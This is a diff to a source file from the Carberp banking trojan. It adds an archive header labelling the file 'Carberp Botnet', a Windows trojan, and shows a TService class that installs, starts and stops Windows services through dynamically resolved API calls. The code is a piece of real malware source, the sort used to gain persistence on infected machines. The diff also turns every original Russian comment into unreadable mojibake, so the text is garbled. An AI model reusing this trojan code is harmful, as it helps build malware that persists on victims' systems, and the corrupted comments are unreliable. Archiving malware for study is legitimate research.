@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #pragma hdrstop
@@ -27,7 +38,7 @@ TService::~TService()
 
 bool TService::Install(const char* ExeName)
 {
-	// Функция инсталирует сервис в системе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Close();
 	if (FManager && !STRA::IsEmpty(ExeName))
 	{
@@ -48,7 +59,7 @@ bool TService::Install(const char* ExeName)
 
 bool TService::Uninstall()
 {
-	// Функция деинсталирует сервис
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = false;
 	if (FManager && !Name.IsEmpty())
 	{
@@ -82,8 +93,8 @@ bool TService::Open()
 
 void TService::Close()
 {
-	// Функция закрывает сервис
-	// Соединение с менеджером остаётся открытым
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (FService)
 	{
 		pCloseServiceHandle(FService);
@@ -94,7 +105,7 @@ void TService::Close()
 
 bool TService::Start()
 {
-	// Функция запускает сервис
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!FService) Open();
 
 	return (BOOL)pStartServiceA(FService, 0, NULL) != FALSE;
@@ -103,30 +114,30 @@ bool TService::Start()
 
 bool TService::Stop(DWORD Timeout)
 {
-	// Функция останавливает сервис
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!FService && !Open())
 		return false;
 
 
 	SERVICE_STATUS Status;
 
-	// Проверяем не остановлен ли сервис
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pQueryServiceStatus(FService, &Status))
 		return false;
 
 	if (Status.dwCurrentState == SERVICE_STOPPED)
 		return true;
 
-	// Оправляем команду на остановку сервиса
-	// В текуще реализации остановки сервиса мы не проверяем
-	// зависимые сервисы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (!pControlService(FService, SERVICE_CONTROL_STOP, &Status))
 		return false;
 
 	DWORD StartTime = (DWORD)pGetTickCount();
 
-	// Ожидаем окончания
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	while (Timeout && Status.dwCurrentState != SERVICE_STOPPED)
 	{
 		pSleep(Status.dwWaitHint);
